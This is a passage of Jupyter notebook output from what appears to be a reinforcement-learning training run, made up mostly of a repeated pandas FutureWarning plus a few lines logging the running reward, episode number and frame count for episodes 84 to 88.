      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1765.24\t Episode 84\t Frame count: 151874\t Context: 2\n",
      "Running reward: -1765.24\t Episode 84\t Frame count: 152524\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1803.15\t Episode 85\t Frame count: 158113\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1803.15\t Episode 85\t Frame count: 161328\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1885.36\t Episode 86\t Frame count: 170278\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -1979.69\t Episode 87\t Frame count: 177121\t Context: 2\n",
      "Running reward: -1979.69\t Episode 87\t Frame count: 178301\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -2036.94\t Episode 88\t Frame count: 178836\t Context: 2\n",
      "Running reward: -2036.94\t Episode 88\t Frame count: 180255\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
